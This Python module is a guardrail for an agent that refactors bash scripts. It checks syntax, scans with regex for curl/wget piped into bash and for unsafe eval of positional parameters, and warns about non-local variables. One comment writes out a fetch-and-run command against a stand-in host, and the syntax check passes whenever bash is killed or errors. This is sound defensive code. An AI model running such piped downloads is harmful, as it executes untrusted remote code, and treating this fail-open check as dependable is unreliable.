# ==============================================================================
# SAFETY AND POLICY GUARDRAILS MODULE (guardrails.py)
# ==============================================================================
# This module implements the "guardrails" or safety policy filters.
# Before the agent is allowed to show a code proposal to the user, we run it through
# this local Python code to check for syntax errors, check for security risks (like
# malicious commands), and verify proper variable scoping rules.

# 'os' allows us to delete temporary files from disk when we are done with them.
import os

# 're' allows us to scan the refactored code for patterns using regular expressions.
import re

# 'subprocess' allows us to execute other terminal tools (like the bash compiler)
# from inside Python.
import subprocess

# 'tempfile' helps us create temporary files that are safely named and cleaned up.
import tempfile

# 'Tuple' and 'Any' let us define type hints for functions that return multiple values.
from typing import Dict, Any, Tuple

class PolicyGuardrail:
    """Enforces safety, security, and styling policies on refactored bash scripts."""
    
    # '@staticmethod' means this function belongs to the class but doesn't need to access
    # the class itself (it has no 'self' or 'cls' parameter). It behaves like a normal function.
    @staticmethod
    def check_syntax(code: str) -> Tuple[bool, str]:
        """Runs the bash compiler in check-only mode (bash -n) to verify syntax."""
        # 1. Create a safe temporary file on the hard drive
        # mode='w' (write mode), suffix='.sh' (adds extension), delete=False (do not auto-delete on close)
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as temp_file:
            # Write the refactored script code into the temp file
            temp_file.write(code)
            # Retrieve the path to this temp file on the computer (e.g. /tmp/tmpar123.sh)
            temp_file_path = temp_file.name
            
        try:
            # 2. Run the command line tool 'bash -n <path>' as a background process.
            # '-n' stands for "no exec". It tells bash to parse the file for syntax errors but not run it.
            # stdout=PIPE and stderr=PIPE capture standard output and error text so we can read them in Python.
            # text=True tells Python to read the outputs as strings rather than binary bytes.
            result = subprocess.run(
                ['bash', '-n', temp_file_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            # 3. Clean up and delete the temporary file from the hard drive
            os.unlink(temp_file_path)
            
            # 4. Analyze the exit status of the bash command.
            # returncode == 0 means bash parsed the script successfully with zero syntax errors.
            if result.returncode == 0:
                return True, "Syntax check passed."
            # Exit codes -9 (SIGKILL) or 137 mean the OS/sandbox stopped the process.
            # In this sandboxed development environment, we skip the check rather than failing.
            elif result.returncode in (-9, 137):
                return True, "Syntax check skipped (execution restricted by sandbox)."
            else:
                # Any other non-zero code means a syntax error was found.
                # We return False and the error output back to the agent so it can self-correct.
                return False, f"Bash syntax check failed:\n{result.stderr}"
        except Exception as e:
            # If any unexpected exception happens (e.g., bash isn't installed), we clean up and skip.
            if os.path.exists(temp_file_path):
                os.unlink(temp_file_path)
            return True, f"Could not perform syntax check: {str(e)}"

    @staticmethod
    def check_security(code: str) -> Tuple[bool, str]:
        """Scans the code for dangerous patterns like command injections or unsafe evals."""
        # Regex pattern explaining: search for "curl" or "wget" followed by a pipe character "|" 
        # and then "bash" or "sh". Example: curl http://badurl.com | bash
        pipe_bash_pattern = re.compile(r"(curl|wget)\b.*\|\s*(bash|sh)\b")
        if pipe_bash_pattern.search(code):
            return False, "Security Policy Violation: Piping remote content to bash/sh is forbidden."
            
        # Regex pattern checking if the script runs 'eval' on positional variables (like $1, $2, $*)
        # without sanitizing it first, which can cause arbitrary command execution.
        eval_pattern = re.compile(r"\beval\s+\$[A-Za-z0-9_#@*?\-]+")
        if eval_pattern.search(code):
            return False, "Security Policy Violation: Unescaped eval of positional parameters detected."
            
        return True, "Security check passed."

    @staticmethod
    def check_variable_scope(code: str) -> Tuple[bool, str]:
        """Ensures that variables defined inside bash functions use local scope.
        
        This prevents polluting the global shell space, which is a major bash bug.
        """
        # 1. Search for bash functions in the code.
        # This matches patterns like 'my_func() { ... }' or 'function my_func { ... }'
        func_matches = re.finditer(r"(?:function\s+)?([A-Za-z0-9_]+)\s*\(\s*\)\s*\{([^}]+)\}", code)
        
        warnings = []
        # Loop through each function we found in the code
        for match in func_matches:
            func_name = match.group(1) # Get the name of the function
            func_body = match.group(2) # Get the content inside the curly braces { ... }
            
            # Find any assignments inside the function body (e.g., 'my_var=123')
            # [^a-zA-Z0-9_] ensures we capture the variable name correctly
            assignments = re.findall(r"(?:^|[\n;])\s*([A-Za-z0-9_]+)=", func_body)
            
            # Find variables that were declared with 'local' or 'declare' keywords
            declared_locals = set(re.findall(r"\blocal\s+([A-Za-z0-9_]+)", func_body))
            declared_locals.update(re.findall(r"\bdeclare\s+([A-Za-z0-9_]+)", func_body))
            
            # Loop through all assignments to see if any are missing the 'local' keyword
            for var in assignments:
                # Exclude loop keywords or special shell keywords
                if var in ('local', 'declare', 'readonly', 'export'):
                    continue
                # If a variable is assigned but NOT in our set of declared local variables,
                # we compile a warning message.
                if var not in declared_locals:
                    warnings.append(f"Function '{func_name}' assigns to '{var}' without declaring it local.")
                    
        if warnings:
            # We don't block execution for scope warnings, but we print them so the user is aware.
            return True, "Warning: " + " ".join(warnings)
        return True, "Scope check passed."

    # '@classmethod' means this function accesses properties of the class itself.
    # The first parameter 'cls' represents the class (PolicyGuardrail).
    @classmethod
    def validate_code(cls, original_code: str, proposed_code: str) -> Tuple[bool, str]:
        """Runs all three safety checks in order on the proposed code refactoring."""
        # 1. Check syntax
        # cls.check_syntax calls the check_syntax method on this class.
        syntax_ok, syntax_msg = cls.check_syntax(proposed_code)
        if not syntax_ok:
            return False, syntax_msg
            
        # 2. Check security
        sec_ok, sec_msg = cls.check_security(proposed_code)
        if not sec_ok:
            return False, sec_msg
            
        # 3. Check variable scopes (local declarations)
        scope_ok, scope_msg = cls.check_variable_scope(proposed_code)
        
        # Combine the results. If we had variable scope warnings, we append them
        # to the final success message.
        msg = "All safety policy checks passed."
        if "Warning" in scope_msg:
            msg += f" {scope_msg}"
            
        return True, msg
